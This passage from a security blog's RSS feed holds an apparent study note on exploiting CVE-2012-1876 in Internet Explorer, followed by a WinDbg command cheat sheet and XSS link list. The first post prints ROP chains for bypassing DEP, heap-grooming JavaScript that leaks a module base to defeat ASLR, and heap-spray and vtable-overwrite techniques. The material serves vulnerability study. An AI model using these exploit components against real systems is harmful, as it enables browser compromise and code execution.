            0x77c4ec00, # pop ebp; retn
            0x77c15ed5, # xchg eax,esp; retn (pivot)
            0x77c4e392, # pop eax; retn
            0x77c11120, # &amp;lt;- *&amp;amp;VirtualProtect()
            0x77c2e493, # mov eax, dword ptr ds:[eax]; pop ebp; retn
            junk,
            0x77c2dd6c,
            0x77c4ec00, # pop ebp; retn
            0x77c35459, # ptr to 'push esp; ret'
            0x77c47705, # pop ebx; retn
            exec_size,  # ebx
            0x77c3ea01, # pop ecx; retn
            0x77c5d000, # W pointer (lpOldProtect) (-&amp;gt; ecx)
            0x77c46100, # pop edi; retn
            0x77c46101, # rop nop (-&amp;gt; edi)
            0x77c4d680, # pop edx; retn
            0x00000040, # newProtect (0x40) (-&amp;gt; edx)
            0x77c4e392, # pop eax; retn
            nop,        # nops (-&amp;gt; eax)
            0x77c12df9  # pushad; retn
          ].pack(&quot;V*&quot;)
      when :jre
        print_status(&quot;Using JRE ROP&quot;)
        exec_size = code.length
        rop =
          [
            0x7c346c0b, # retn
            0x7c36f970, # pop ebp; retn
            0x7c348b05, # xchg eax,esp; retn (pivot)
            0x7c36f970, # pop ebp; retn [MSVCR71.dll]
            0x7c36f970, # skip 4 bytes [MSVCR71.dll]
            0x7c34373a, # pop ebx ; retn [MSVCR71.dll]
            exec_size,  # ebx
            0x7c3444d0, # pop edx ; retn [MSVCR71.dll]
            0x00000040, # 0x00000040-&amp;gt; edx
            0x7c361829, # pop ecx ; retn [MSVCR71.dll]
            0x7c38f036, # &amp;amp;Writable location [MSVCR71.dll]
            0x7c342766, # pop edi ; retn [MSVCR71.dll]
            0x7c346c0b, # retn (rop nop) [MSVCR71.dll]
            0x7c350564, # pop esi ; retn [MSVCR71.dll]
            0x7c3415a2, # jmp [eax] [MSVCR71.dll]
            0x7c3766ff, # pop eax ; retn [MSVCR71.dll]
            0x7c37a151, # ptr to &amp;amp;VirtualProtect() - 0x0ef [IAT msvcr71.dll]
            0x7c378c81, # pushad # add al,0ef ; retn [MSVCR71.dll]
            0x7c345c30  # ptr to 'push esp; ret ' [MSVCR71.dll]
          ].pack(&quot;V*&quot;)

虚拟机中(win7x64+immunity debugger32+python32+mona)用如下命令获取的rop gadgets:
command:!mona rop -m msvcrt.dll -cp nonull
rop gadgets:

		 def create_rop_chain()

		   # rop chain generated with mona.py - www.corelan.be
		   rop_gadgets =
		   [
			 0x7788ea09,  # POP EBP # RETN [msvcrt.dll]
			 0x7788ea09,  # skip 4 bytes [msvcrt.dll]
			 0x778afd36,  # POP EAX # RETN [msvcrt.dll]
			 0x3974ffff,  # put delta into eax (-&amp;gt; put 0x00000001 into ebx)
			 0x77847a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll]
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x7788d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll]
			 0x7785f5d4,  # POP EAX # RETN [msvcrt.dll]
			 0x39750ffe,  # put delta into eax (-&amp;gt; put 0x00001000 into edx)
			 0x77847a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll]
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x41414141,  # Filler (compensate)
			 0x7786ad98,  # XCHG EAX,EDX # RETN [msvcrt.dll]
			 0x7785aeba,  # POP EAX # RETN [msvcrt.dll]
			 0xa2a7fcd6,  # put delta into eax (-&amp;gt; put 0x00000040 into ecx)
			 0x778b950f,  # ADD EAX,5D58036A # RETN [msvcrt.dll]
			 0x7784b984,  # XCHG EAX,ECX # ADD AL,5D # RETN 0x04 [msvcrt.dll]
			 0x77850a31,  # POP EDI # RETN [msvcrt.dll]
			 0x41414141,  # Filler (RETN offset compensation)
			 0x77829f09,  # RETN (ROP NOP) [msvcrt.dll]
			 0x7787c433,  # POP ESI # RETN [msvcrt.dll]
			 0x7782b7bd,  # JMP [EAX] [msvcrt.dll]
			 0x77851a3a,  # POP EAX # RETN [msvcrt.dll]
			 0x778211bc,  # ptr to &amp;amp;VirtualAlloc() [IAT msvcrt.dll]
			 0x77885cfc,  # PUSHAD # RETN [msvcrt.dll]
			 0x778530ad,  # ptr to 'call esp' [msvcrt.dll]
		   ].flatten.pack(&quot;V*&quot;)

		   return rop_gadgets

		 end
发现rop gadgets的地址并不一样,在msf中测试msf的exp是否有效,结果win7x64中的iex32并没有成功溢出,而是停止工作了,这
里查看系统是否开了dep,发现是开了的,难道msf中的exp不支持绕过dep?为了验证,将win7x64中dep关闭(要重启),重新测试msf
的exp,发现还是无法成功溢出,ie和之前一样出现异常而停止工作,后来看到书中配套资料中的rb文件是和msf中的rb文件不一样
的,msf中的rb文件应该是依靠没有启用aslr模块(msvcrt或jre)来一次溢出利用的,不过msf中的rb在本机测试并没有用,后来重
新测试书中配套资料中的rb文件,该rb文件是二次溢出来利用漏洞,第一次溢出找到模块基址,第二次溢出控制代码执行流程,但
是在本机测试依然失败,尝试换成x32系统,仍然失败,后来觉得可能是系统已经安装了补丁,但是systeminfo | find
&quot;2699988&quot;没有找到,不知为何会出现这种情况,尝试用脚本将系统补丁全部删除,再重新尝试,在实验的win7x64位系统上仍然失
败,或许是书中配套资料中的rb文件也不是可以利用的,无奈放下这个问题,这里只学习书中提到的相关技术与这个漏洞的分析.

技术点

[+] cmd中用gflags.exe对ie进程开启hpa选项后,用ie打开poc.html,ie崩溃但是却没有被windbg拦截到异常,原因是ie衍生出子
进程,而windbg默认情况下是不支持子进程调试的,下面命令可开启子进程调试:
.childdbg 1

[+] 书中某一调试步骤中ln 69a69868命令得到的结果为:
(69a69868) mshtml!CTableLayout::`vftable` | (69a699a8) mshtml!CTableLayoutBlock::`vftable`
其中的关键字vftable是指&quot;虚表&quot;,虚表与类与虚表指针与对象的关系可参考下面链接:
http://blog.csdn.net/w616589292/article/details/51250285
http://blog.csdn.net/coolshine1234/article/details/17390143
http://blog.csdn.net/luxiaoyu_sdc/article/details/6145403
a)虚表对应类,虚表指针对应对象
b)对象的头4个字节存放的是虚表指针,虚表中每4个字节存放一个虚函数地址,各个虚函数地址构成一张&quot;表&quot;(这里指32位系统下
为4字节,64位系统应该是8字节)
如果[addr]=69a69868,由于69a69868处是虚表,也即69a69868是虚表指针的值,说明addr是对象所在的内存地址,书中参数1指的
是这里的addr,也即书中的[ebp+8]==poi(ebp+8)=065b9ea8

[+] 通过覆盖BSTR头部长度值得到模块基址.可参考如下链接:
http://www.cnblogs.com/Danny-Wei/p/3766337.html
BSTR是一种字符串数据类型,一种Pascal-Style字符串(明确标示字符串长度)和C-Style字符串(以\0结尾)的混合物,主要用于
COM,交互功能等,是一种复合的数据类型,由一个长度前缀,数据字符串和一个终止符组成,如下图所示:

header|               |terminator
4bytes|string(unicode)|00 00

通过修改header的内容修改BSTR的长度,使得BSTR可以访问可以访问原始界限以外的内存,由此可获得相关模块的基址以构造rop
链绕过aslr,具体如下:
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------

首先在内存中连续创建一定数量且大小相同的BSTR,它们在内存中布局如上所示,然后释放一个BSTR并申请一个相同大小的
object(对象),申请的object很可能会被分配到刚刚释放的BSTR所在内存空间上,变成下面:
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|object|BSTR|BSTR|BSTR|
-------------------------------
|BSTR|BSTR|BSTR|BSTR|BSTR|BSTR|
-------------------------------
此时可修改object前面一个BSTR的header内容,使该BSTR可以访问到object的虚表指针(在object的开关4字节),最终可计算出相
关模块的内存基址.有时候不能修改4字节的BSTR的header内容而只能修改1-2字节时,可以通过修改BSTR的终止符,从而将string
与后面的object连接起来,随后访问修改后的BSTR,也可以访问到object并计算相关模块基址

[+] 上面一个技术点中的通过得到object对象的虚表指针计算模块基址的方法为:
eg.mshtml.dll!CButtonLayout::`vftable`表示mshtml模块中的CButtonLayout类的虚函数表
如果某内存地址为addr处存放的是mshtml模块的CButtonLayout类的虚函数表,则addr是CButtonLayout对象的虚表指针的值,而
aslr的功能是让mshtml模块在内存中加载的基址不同,但addr在mshtml模块中的偏移是固定的,这个偏移量可在动态调试时容易
得到,假设addr在mshtml模块中的偏移量为x,那么由addr计算出mshtml模块为:mshtmlBase_=addr-x
也即对应书中对应的:
mshtmlbase=leak_addr-Number(0x001582b8)

这个技术点是典型的通过内存信息泄露(CButtonLayout对象的虚表指针泄露)获取有关内存布局,目标进程相关的状态信息的方
法,也可以通过静态变量的指针值等获取dll基址

[+] 绕过dep+aslr的一种思路
通过2次溢出,第一次溢出得到模块基址,第二次溢出控制代码执行eip

[+] 书中的构造堆布局以便将mshtml.dll基址泄露的js代码为:

&amp;lt;div id=&quot;test&quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;script language='javascript'&amp;gt;
var leak_index=-1
var dap=&quot;EEEE&quot;
while (dap.length&amp;lt;480) dap+=dap

var padding=&quot;AAAA&quot;
while (padding.length&amp;lt;480) padding+=padding

var filler=&quot;BBBB&quot;
while (filler.length&amp;lt;480) filler+=filler

var arr=new Array()
var rra=new Array()

var div_container=document.getElementById(&quot;test&quot;)
div_container.style.cssText=&quot;display:none&quot;

for (var i=0;i&amp;lt;500;i+=2){
rra[i]=dap.substring(0,(0x100-6)/2)
arr[i]=padding.substring(0,(0x100-6)/2)
arr[i+1]=filler.substring(0,(0x100-6)/2)

var obj=document.createElement(&quot;button&quot;)
div_container.append(obj)
}

for (var i=200;i&amp;lt;500;i+=2){
rra[i]=null
CollectGarbage()
}

&amp;lt;/script&amp;gt;

上面js代码产生如下效果:
rra[0]=E..E(125个E,占内存大小为0x100)
rra[2]=E..E(125个E,占内存大小为0x100)
...
...
...
rra[498]=E..E(125个E,占内存大小为0x100)

arr[0]=A..A(125个A,占内存大小为0x100)
arr[1]=B..B(125个B,占内存大小为0x100)
arr[2]=A..A(125个A,占内存大小为0x100)
arr[3]=B..B(125个B,占内存大小为0x100)
...
...
...
arr[498]=A..A(125个A,占内存大小为0x100)
arr[499]=B..B(125个B,占内存大小为0x100)

CButtonLayout
CButtonLayout
...
...
CButtonLayout
(共250个CButonLayout对象)

在代码中分别产生了rra数组,arr数组,CButtonLayout对象,但是在内存中并不是按照上面的存放顺序存放的,数组并不是存放在
连续的内存空间中,而是在for循环中连续存放如下:

|rra[0]=E..E(125个E)|arr[0]=A..A(125个A)|arr[1]=B..B(125个B)|CButonLayout|rra[2]=E..E(125个E)|arr[2]=A..A......
纵向排列如下:
|rra[0]=E..E(125个E)|arr[0]=A..A(125个A)|arr[1]=B..B(125个B)|CButonLayout|
|rra[2]=E..E(125个E)|arr[2]=A..A(125个A)|arr[3]=B..B(125个B)|CButonLayout|
|rra[4]=E..E(125个E)|arr[4]=A..A(125个A)|arr[5]=B..B(125个B)|CButonLayout|
...
...
|rra[498]=E..E(125个E)|arr[498]=A..A(125个A)|arr[499]=B..B(125个B)|CButonLayout|

#接着又间隔释放了从rra[200],rra[202],rra[204]...到rra[498](一共150个rra中元素被释放)
每个rra或arr数组的元素或CButonLayout对象都是分配在堆块当中,在计算长度的时候要算上堆块最开关的8字节的堆块指针位
置

[+] 通过修改对象的虚表指针和heap spary来达到控制指令流程的方法:
1)传统的堆喷射是申请200个每个1M的内存块,200x1024x1024=0x0c800000&amp;gt;0x0c0c0c0c,在0c0c0c0c处布置90nop就可以执行到
shellcode了,因为这样的内存布局在0x0c0c0c0c处是90nop的概率在99.99%以上,每个1M的内存分布图如下:

Header 32bytes|Length 4bytes|0x90|0x90|0x90|0x90|0x90|...
|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|
|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|
|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|
|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|
|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|0x90|
...
...
...
|0x90|0x90|0x90|0x90|0x90|0x90|0x90|shellcode|Null 2bytes|

2)此漏洞cve-2012-1876不能用上面的传统的heap spary方法,因为该漏洞可以做的是:
修改对象(CButonLayout)的头4字节的虚表指针,要通过修改虚表指针和heap spary来达到控制指令执行流程,要在内存中布局如
下图:

Header 32bytes|Length 4bytes|0x0c|0x0c|0x0c|0x0c|0x0c|...
|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|
|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|
|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|
|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|
|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|
...
...
...
|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|0x0c|shellcode|Null 2bytes|

因为0x0C0C会被当成一条指令&quot;or al,0Ch&quot;,是除了0x90以外的另外一种nop指令,不影响shellcode的执行,所以将虚表指针修改
为0x0c0c0c0c之后会执行call [0x0c0c0c0c],也即call 0x0c0c0c0c,之后就可以执行shellcode了,也可参考如下链接:
http://blog.csdn.net/magictong/article/details/7391397

在书中介绍这个漏洞中,书中对应exp(和msf中exp)都是将虚表指针修改为1178993*100=0x07070024,之后有对虚表中偏移+8处的
虚函数指针的函数调用call [eax+8],也即call [0x0707002c],只要按照上面布置内存分布,在0x0707002c(除了0x0c0c0c0c以外
,0x0707002c也可以是稳定的可利用的地址)处将有99.99%的可能性会对应0x0c0c0c0c指令,然后一直执行0c0c到shellcode处,也
即实现了通过修改虚表指针和heap spary来达到控制指令执行流程目的

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 05 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/05/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2012-1876/</guid>
        
        <category>bin</category>
        
        <category>js</category>
        
        <category>ie</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>windbg命令</title>
        <description>&lt;h3 id=&quot;0x01-windbg知识&quot;&gt;0x01 windbg知识&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.yiiyee.cn/Blog/windbg/
http://www.cppblog.com/weiym/archive/2012/06/07/177958.aspx

1&amp;gt;db esi:查看esi地址中的内容
	db 400000:查看0x400000处的内容,db按字节大小查看,dd按DWORD类型查看
	dd poi(addr)
		poi(addr)相当于[addr],也即addr中存放的值,dd poi(addr)也即相当于dd addr1,其中addr1=[addr]

2&amp;gt;!address edi:显示edi地址处的内存状态,信息

3&amp;gt;lmm mso v:匹配mso模块,并显示详细信息
  ln addr:查找附近的符号
  x something:查找模块在内存中的地址
  	eg.x *!:查看所有模块在内存中的地址范围
	eg.x sufilter!:查看sufilter所有的代码符号(全局变量,函数)的加载地址
	eg.x sufilter!sufilterreadwritemt:查看模块中的函数的地址

4&amp;gt;bp eax:在eax处下断点,支持第几次经过后中断,支持中断后执行命令
  bp addr 在addr处设置断点
  bl 查看所有有已经设置的断点
  bc 清除所有断点
	  bc * 清除所有断点
  bu 对某个符号下断点,eg. bu MyApp!SomeFunction
	  在代码被修改之后,该断点会随着函数地址改变而自动更新到最新位置,而且bu断点会保存在WinDbg工作空间中,下
	  次启动WinDbg时该断点会自动设置
  bd 禁用断点
  be 启用被bd命令禁用的断点
  ba e|r|w(执行|读|写) 1|2|4|8(单位字节) addr
	  eg.对内存0x11111111进行写操作的时候下断点命令为:ba w4 0x11111111

5&amp;gt;g:让被调试的程序继续运行(f5)
  gh:把异常标识为已处理并断续执行程序
  go:对异常不进行任何处理并继续执行程序

6&amp;gt;kb:显示传递给堆栈回溯中的每个函数的前三个参数
  kp:显示传递给堆栈回溯中的每个函数的所有参数

7&amp;gt;u .:反汇编当前eip处的8条指令
  uf .:反汇编当前eip处的整个函数
  ub .:反汇编当前eip之前的8条指令
  u eip eip+a:反汇编eip到eip+10(a是16进制对应10进制的10)之间的指令
		eg.u eip-30 eip+30
  ub mso!Ordinal1273+0x2581:反汇编mso!Ordinal1273+0x2581地址之前的代码
	  uf test!main:反汇编test!main函数

8&amp;gt;p:单步步入step over
  t:单步步过trace into
  gu:执行到上一层函数,也即把当前函数帧执行到retn,并执行这个retn

9&amp;gt;? ebp-edi:显示表达式ebp-edi的值
	?? expression:显示c++表达式的值
10&amp;gt;.cls:清屏

11&amp;gt;获取进程环境块_PEB:
	a&amp;gt;.process 获得_PEB地址设为addr
	  dt _PEB 0xaddr可得到_PEB结构的数据
	b&amp;gt;也可通过dt _PEB @$peb直接获取_PEB结构的数据

12&amp;gt;查看堆的信息:
	!heap -h 查看所有堆的地址
	dt _HEAP 0xaddr 查看一个堆的信息
	dt _LIST_ENTRY 0xaddr 查看addr地址中存放的堆块索引信息,得到的结果为Flink和Blink的值

	!heap -h 查看所有的堆的情况,也可通过!heap直接查看
	!heap -a addr addr要求是一个堆的起始地址,该命令显示这个堆的信息
	!heap -p -a addr 查看一个地址在哪个堆块中,并显示这个堆块的信息

13&amp;gt;sxe ld:ModuleName 在首次加载ModuleName对应的模块时中断
	sx{e|d|i|n} [-c &quot;Cmd1&quot;] [-c2 &quot;Cmd2&quot;] [-h] {Exception|Event|*} 
		http://blog.csdn.net/hgy413/article/details/7598236

14&amp;gt;其中windbg中的kb命令相当于od中的查看调用堆栈(alt+k),如下图中的ChildEBP列为当前eip对应的ebp的值,RetAddr为当
   前eip所在的函数的函数返回地址,Args to Child为当前函数的参数,最后一列的地址是当前排的上一排中的RetAddr的值

   要注意的是,并不是kb下面的所有的ChildEBP对应的一列都是函数调用,只有第一排的ChildEBP,RetAddr,Args to
   Child的数据值是当前的函数调用的相关参数,从第二排开始的只是栈中高地址的数据内容从ebp到retn到参数相当于地址从

   一般情况下,栈空间中的低地址向高地址的排列,函数调用时,栈中的数据如下:

            ...
            ...    (new ebp为当前函数帧中的新的ebp,此处的new ebp代表当前函数帧的ebp的位置所在) 
new ebp --&amp;gt; old ebp(old ebp为上一函数帧的ebp,此处的old ebp代表new ebp位置中的内容值) 
            retn   (retn为当前函数的返回地址)
            arg1   (arg1为当前函数的第一个参数)
            arg2   (arg2为当前函数的第二个参数)
            ...

   也即当前ebp中存放的是上一函数帧的ebp,且当前ebp的下一栈单元的内容为当前函数的retn地址
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-windbg技巧&quot;&gt;0x02 windbg技巧&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;用windbg附加要调试的程序时,在调试之前用gflag.exe开启了+hpa,但是在调试时,程序崩溃了而windbg没有断下来,这种情况
主要原因是被调试的程序衍生出子进程,而windbg默认情况下是不支持子进程调试的,可以使用如下命令开启子进程调试:
	.childdbg 1


&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 02 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/02/windbg%E5%91%BD%E4%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/12/02/windbg%E5%91%BD%E4%BB%A4/</guid>
        
        <category>windbg</category>
        
        <category>bin</category>
        
        
        <category>二进制</category>
        
      </item>
    
      <item>
        <title>xss好用姿势</title>
        <description>&lt;p&gt;xss库&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.http://www.backlion.org/?p=6218
2.https://www.leavesongs.com/PENETRATION/xss-collect.html
3.文件上传XSS:http://www.55118885.com/w/529184.html
4.https://xianzhi.aliyun.com/forum/read/536.html

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Tue, 29 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2016/11/29/xss%E5%A5%BD%E7%94%A8%E5%A7%BF%E5%8A%BF/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2016/11/29/xss%E5%A5%BD%E7%94%A8%E5%A7%BF%E5%8A%BF/</guid>
        
        <category>xss</category>
        
        <category>web</category>
        
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
